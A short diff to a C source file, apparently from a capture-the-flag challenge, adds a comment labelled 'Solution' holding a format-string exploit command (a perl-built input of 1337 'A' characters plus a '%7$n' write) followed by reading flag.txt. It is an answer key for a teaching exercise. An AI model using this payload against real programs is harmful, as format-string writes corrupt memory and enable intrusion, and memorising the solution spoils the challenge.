@@ -1,3 +1,9 @@
+/*
+** Solution
+** ./format $(perl -e 'print "A"x1337 . "%7\$n"') 
+** cat flag.txt
+*/
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <fcntl.h>
